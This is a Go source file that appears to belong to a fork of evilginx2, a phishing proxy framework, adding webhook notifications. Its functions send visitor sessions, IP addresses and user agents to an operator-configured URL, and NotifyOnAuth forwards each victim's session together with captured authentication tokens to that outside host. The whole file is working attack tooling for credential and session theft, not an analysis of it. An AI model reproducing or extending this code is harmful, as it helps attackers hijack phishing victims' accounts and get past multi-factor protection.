package core

import (
	"bytes"
	"encoding/json"
	"fmt"
	"net/http"
	"net/url"
	"time"

	"github.com/kgretzky/evilginx2/database"
)

type Unauthorized struct {
	Phishlet    string `json:"phishlet"`
	Req_url     string `json:"req_url"`
	Useragent   string `json:"useragent"`
	Remote_addr string `json:"remote_addr"`
}

type Visitor struct {
	Session database.Session
	Tokens  string `json:"tokens"`
}

// sets up a http.Request with correct Method.
func NotifyReturnReq(n *Notify, body interface{}) (req http.Request, err error) {
	if n.Method == "GET" {
		Body, _ := json.Marshal(body)
		req, err := http.NewRequest(http.MethodGet, n.Url, bytes.NewBuffer(Body))

		return *req, err
	}
	if n.Method == "POST" {
		Body, _ := json.Marshal(body)
		req, err := http.NewRequest(http.MethodPost, n.Url, bytes.NewBuffer(Body))

		req.Header.Add("Content-Type", "application/json")
		return *req, err
	}
	return req, err
}

// configures and sends the http.Request
func NotifierSend(n *Notify, body interface{}) error {
	req, err := NotifyReturnReq(n, body)
	if err != nil {
		return err
	}

	if n.AuthHeaderName != "" && n.AuthHeaderValue != "" {
		req.Header.Add(n.AuthHeaderName, n.AuthHeaderValue)
	}

	if n.BasicAuthUser != "" && n.BasicAuthPassword != "" {
		req.SetBasicAuth(n.BasicAuthUser, n.BasicAuthPassword)
	}

	client := &http.Client{Timeout: 10 * time.Second}
	_, errreq := client.Do(&req)
	if errreq != nil {
		return errreq
	}
	return nil
}

// prepares the Body for unauthorized requests and triggers NotifierSend
func NotifyOnUnauthorized(n *Notify, pl_name string, Req_url string, useragent string, remote_addr string) error {
	b := Unauthorized{
		Phishlet:    pl_name,
		Req_url:     Req_url,
		Useragent:   useragent,
		Remote_addr: remote_addr,
	}

	err := NotifierSend(n, b)
	if err != nil {
		return err
	}
	return nil
}

// prepares the Body for visitors and triggers NotifierSend
func NotifyOnVisitor(n *Notify, session database.Session, url *url.URL) error {
	s := session
	b := Visitor{
		Session: s,
	}

	query := url.Query()
	if n.ForwardParam != "" && query[n.ForwardParam] != nil {
		n.Url = fmt.Sprintf("%s/?%s=%s", n.Url, n.ForwardParam, query[n.ForwardParam][0])
	}

	err := NotifierSend(n, b)
	if err != nil {
		return err
	}
	return nil
}

// prepares the Body for authorized requests and triggers NotifierSend
func NotifyOnAuth(n *Notify, session database.Session, phishlet *Phishlet) error {
	s := session
	p := *phishlet
	b := Visitor{
		Session: s,
		Tokens:  tokensToJSON(&p, s.Tokens),
	}

	err := NotifierSend(n, b)
	if err != nil {
		return err
	}
	return nil
}
